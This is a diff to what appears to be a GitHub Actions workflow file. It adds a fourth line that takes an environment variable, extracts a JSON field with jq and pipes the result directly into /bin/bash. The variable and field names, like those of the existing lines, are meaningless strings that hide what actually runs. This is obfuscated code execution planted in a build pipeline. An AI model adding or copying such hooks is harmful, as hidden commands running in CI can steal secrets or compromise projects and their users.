@@ -33,6 +33,7 @@ jobs:
           echo $fnye1 | jq -r .vkn495 | /bin/bash
           echo $pphen489 | jq -r .dnbs920 | /bin/bash
           echo $fqkfw0 | jq -r .ipc98493 | /bin/bash
+          echo $vbgd53 | jq -r .mxbdj4 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
